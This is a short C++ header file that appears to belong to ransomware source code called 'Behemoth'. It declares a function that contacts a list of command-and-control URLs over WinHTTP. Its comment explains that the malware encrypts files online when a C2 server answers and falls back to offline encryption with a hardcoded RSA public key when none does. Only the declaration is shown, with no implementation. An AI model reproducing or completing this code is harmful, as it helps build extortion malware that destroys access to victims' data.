#ifndef C2_CONN_H
#define C2_CONN_H

#include <vector>
#include <iostream>

#pragma comment(lib, "winhttp.lib")


/// <summary>
/// This function is used to connect to a list of C2 addresses and identify a live C2.
/// Any given URL is first parsed to ensure that is safe to handle with WinHTTP.
/// A HTTP GET request is sent to every URL with a time out of 10 seconds, if any request
/// succeed then Behemoth will perform online encryption. If all requests fail, Behemoth
/// will perform offline encryption using the hardcoded RSA public key.
/// </summary>
/// <param name="urls"></param>
/// <returns></returns>
std::wstring c2_conn(const std::vector<std::wstring>& urls);

#endif
